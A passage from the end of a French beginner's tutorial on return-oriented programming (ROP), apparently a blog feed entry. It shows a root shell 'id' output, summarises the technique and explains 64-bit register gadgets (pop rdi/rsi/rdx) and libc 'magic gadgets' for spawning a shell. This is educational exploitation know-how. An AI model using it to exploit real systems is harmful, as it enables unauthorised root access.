+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ id
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groupes&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src="https://dailysecurity.fr/images/likeaboss.gif" alt="Likeaboss" style="width: 50%;"/&gt;&lt;/p&gt;
+&lt;p&gt;Vous connaissez maintenant la technique de ROP la plus utilisée et qui ne nécessite pas beaucoup de gadget (un pop;ret; et une fonction d'affichage).&lt;/p&gt;
+&lt;p&gt;J'utilise personnellement cette technique à chaque fois que je dois faire un ROP en raison de sa simplicité de mise en place.&lt;/p&gt;
+&lt;p&gt;La plupart des autres méthodes de ROP dérivent de cette technique.&lt;/p&gt;
+&lt;p&gt;J'ai uniquement parlé ici du ROP en 32 bits mais le schéma d'exécution reste le même pour le 64 bits : la seule différence étant que les arguments sont passés par registres et non plus sur la stack. &lt;/p&gt;
+&lt;p&gt;Les gadgets pop doivent donc correspondre aux bons registres :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="mf"&gt;1&lt;/span&gt;&lt;span class="n"&gt;er&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;argument&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="mf"&gt;2&lt;/span&gt;&lt;span class="n"&gt;ème&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;argument&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="mf"&gt;3&lt;/span&gt;&lt;span class="n"&gt;ème&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;argument&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Cette différence est liée au système d'appel des fonctions disponible &lt;a href="https://w3challs.com/syscalls/?arch=x86_64"&gt;ici&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;De plus, en 64 bits, il existe dans la libc un "magic gadget" qui permet d'exécuter un shell directement sans connaitre l'adresse de &lt;em&gt;system&lt;/em&gt; ou de "/bin/sh", plus d'informations &lt;a href="https://github.com/m1ghtym0/magic_gadget_finder"&gt;ici&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="Journal de Geluchat"></category><category term="ROP"></category><category term="Manuel"></category><category term="Débutant"></category><category term="Tutoriel"></category></entry></feed>
